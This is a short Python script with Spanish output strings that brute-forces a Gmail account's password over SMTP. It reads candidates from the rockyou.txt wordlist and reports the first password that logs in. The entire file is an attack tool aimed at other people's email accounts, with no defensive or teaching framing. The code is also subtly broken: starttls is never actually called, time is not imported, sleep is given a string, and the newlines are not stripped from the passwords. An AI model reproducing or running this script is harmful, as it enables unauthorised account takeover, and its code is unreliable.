import smtplib

smtsrv = smtplib.SMTP("smtp.gmail.com", 587)
smtsrv.ehlo()
smtsrv.starttls

print("\n")

email = input("correo ->")

dic = open("./rockyou.txt", "r")

for pwd in dic:
    try:
        smtsrv.login(email, pwd)
        print("¡¡listo!!  contraseña: %s" %pwd)
        break;
    except smtplib.SMTPAuthenticationError:
        print("contraseña incorrecta %s" % pwd)
        time.sleep("20")
